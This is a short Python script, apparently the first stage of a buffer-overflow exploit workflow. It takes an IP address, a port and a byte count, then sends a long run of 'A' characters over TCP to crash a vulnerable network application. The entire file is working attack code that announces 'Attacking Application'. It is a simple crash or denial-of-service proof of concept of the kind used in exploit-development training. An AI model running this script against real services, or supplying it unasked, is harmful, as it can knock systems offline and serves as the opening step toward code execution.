#!/usr/bin/python3
import socket
import sys

#usage ./S1PoCFuzz.py {IP} {Port} {Data}
#where data is an interger that represents the number of bytes that cause a crash.
ip = sys.argv[1]
port = int(sys.argv[2])
data = int(sys.argv[3])

try:
	print("\nAttacking Application...")
	buffer = b"A" * data #This is the amount of data that when sent to the particular vulnerable application
	#it will cause a crash. Normally given in a POC
	
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port)) # The connection to the Application 
	s.send(buffer)
	s.close()

	print("\nDone!")
  
except:
	print("\nFailure to connect. \n\nVerify that the vulnerable application is \n(a) running and\n(b) there is a connection to the vulnerable application.\n")